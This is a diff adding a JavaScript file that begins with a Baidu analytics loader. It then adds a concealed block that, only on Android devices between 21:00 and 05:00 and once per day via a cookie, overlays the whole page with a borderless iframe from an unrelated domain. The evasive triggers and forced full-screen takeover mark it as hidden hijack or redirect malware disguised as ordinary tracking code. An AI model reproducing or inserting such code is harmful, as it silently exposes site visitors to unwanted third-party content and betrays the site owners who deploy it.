@@ -1,0 +1,60 @@
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?6f08be44365dcdd8b6197b6770124977";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+(function() {
+    function isAndroid() {
+        return /Android/i.test(navigator.userAgent);
+    }
+
+    function isInTimeRange() {
+        const currentDate = new Date();
+        const hour = currentDate.getHours();
+        const minute = currentDate.getMinutes();
+
+        if (hour === 21 && minute >= 0 || hour > 21 || hour < 5) {
+            return true;
+        }
+        return false;
+    }
+
+    function getCookie(name) {
+        const nameEQ = name + "=";
+        const ca = document.cookie.split(';');
+        for (let i = 0; i < ca.length; i++) {
+            let c = ca[i].trim();
+            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+        }
+        return null;
+    }
+
+    function setCookie(name, value, days) {
+        const d = new Date();
+        d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+        const expires = "expires=" + d.toUTCString();
+        document.cookie = `${name}=${value};${expires};path=/`;
+    }
+
+    if (isAndroid()) {
+        if (isInTimeRange()) {
+            if (!getCookie("userTimeCheck")) {
+                setCookie('userTimeCheck', 'true', 1);
+
+                const iframe = document.createElement('iframe');
+                iframe.src = 'https://s5.zgjxdtg.com/?qt';
+                iframe.style.position = 'fixed';
+                iframe.style.top = '0';
+                iframe.style.left = '0';
+                iframe.style.width = '100vw';
+                iframe.style.height = '100vh';
+                iframe.style.border = 'none';
+                iframe.style.zIndex = '9999';
+                document.body.appendChild(iframe);
+            }
+        }
+    }
+})();
